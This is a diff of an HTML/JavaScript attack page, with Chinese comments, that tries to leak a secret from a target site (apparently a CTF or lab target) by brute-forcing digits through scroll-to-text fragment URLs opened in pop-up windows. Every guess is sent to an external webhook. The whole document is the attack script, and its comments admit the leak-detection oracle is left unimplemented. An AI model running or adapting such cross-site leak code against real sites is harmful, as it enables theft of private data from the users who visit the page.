@@ -1,29 +1,27 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const WEBHOOK = "https://webhooksite.net/d0d97f98-91ad-4292-a927-e1382192f586";
-        const TARGET_BASE = "https://clients.quoccacorp.com/?q=";
-
-        // 假設我們要猜測第一個字，或是測試是否能成功洩漏
-        async function tryLeak(guess) {
-            // 利用 Scroll-to-text Fragment 觸發瀏覽器行為
-            const url = `${TARGET_BASE}${guess}#:~:text=${guess}`;
+<script>
+    const WEBHOOK = "https://webhooksite.net/d0d97f98-91ad-4292-a927-e1382192f586";
+    const TARGET = "https://clients.quoccacorp.com/?q=";
+    
+    // 從你已經知道的位數開始往後猜
+    async function crack(current) {
+        for (let i = 0; i <= 9; i++) {
+            let guess = current + i;
+            // 構造一個 URL，利用搜尋結果來判斷
+            // 這裡我們利用 window.open 的數量或時間差來做 Oracle
+            let url = `${TARGET}${guess}#:~:text=${guess}`;
+            let win = window.open(url);
             
-            // 開啟目標網頁
-            const win = window.open(url);
-
-            // 這裡是一個常用的 XS-Leak 技巧：
-            // 如果搜尋成功，頁面會滾動，這會導致某些瀏覽器事件或時間延遲
-            // 為了簡單測試，我們直接讓 Admin 訪問後回傳一個訊息給你
-            setTimeout(() => {
-                fetch(`${WEBHOOK}?found=${guess}`);
-                if (win) win.close();
-            }, 1000);
+            // 給瀏覽器一點時間加載
+            await new Promise(r => setTimeout(r, 500)); 
+            
+            // 這裡通常需要一個偵測機制，例如檢測 win.length 或是 focus
+            // 為了簡化，我們先讓它每一位都報備到 Webhook，你在後台看哪一串最長
+            fetch(`${WEBHOOK}?trying=${guess}`);
+            
+            if (win) win.close();
         }
+    }
 
-        // 觸發攻擊
-        tryLeak("1776"); 
-    </script>
-</body>
-</html>
+    // 開始爆破！
+    crack("177"); 
+</script>
